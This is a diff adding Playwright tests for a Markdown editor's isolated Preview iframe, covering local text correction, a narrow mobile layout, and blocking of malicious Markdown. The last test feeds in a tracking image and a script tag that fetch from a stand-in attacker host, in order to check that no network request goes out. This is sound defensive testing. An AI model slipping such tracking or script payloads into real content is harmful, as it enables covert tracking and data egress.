@@ -1,0 +1,35 @@
+import { test, expect } from '@playwright/test';
+
+test('PWA Markdown Source and safe Preview local patch', async ({ page }) => {
+  await page.goto('/markdown');
+  const source = page.getByRole('textbox', { name: 'Source — Markdown canônico' });
+  await source.fill('# Teste\n\nTexto simples');
+  const preview = page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]');
+  await expect(preview.locator('h1')).toContainText('Teste');
+  await preview.locator('.md-correctable').filter({ hasText: 'Texto simples' }).click();
+  await preview.getByRole('textbox', { name: 'Corrigir texto no Preview' }).fill('Texto alterado');
+  await preview.getByRole('button', { name: 'Aplicar correção' }).click();
+  await expect(source).toHaveValue('# Teste\n\nTexto alterado');
+  await expect(page.getByRole('status').first()).toContainText('não salva');
+});
+
+test('320px layout retains Source and Preview with tabs', async ({ page }) => {
+  await page.setViewportSize({ width: 320, height: 680 });
+  await page.goto('/markdown');
+  const source = page.locator('#markdown-source');
+  await source.fill('## Mobile\n\nTexto');
+  await page.getByRole('button', { name: 'Preview', exact: true }).click();
+  await expect(page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]').locator('h2')).toHaveText('Mobile');
+  await page.getByRole('button', { name: 'Source', exact: true }).click();
+  await expect(source).toHaveValue('## Mobile\n\nTexto');
+});
+
+test('malicious Markdown does not trigger network egress', async ({ page }) => {
+  const requests: string[] = [];
+  page.on('request', req => { if (/attacker\.invalid/.test(req.url())) requests.push(req.url()); });
+  await page.goto('/markdown');
+  await page.locator('#markdown-source').fill('![x](https://attacker.invalid/track)\n\n<script>fetch("https://attacker.invalid/ping")</script>');
+  await expect(page.frameLocator('iframe[title="Pré-visualização Markdown isolada"]').locator('.md-blocked-image')).toBeVisible();
+  await page.waitForTimeout(100);
+  expect(requests).toEqual([]);
+});
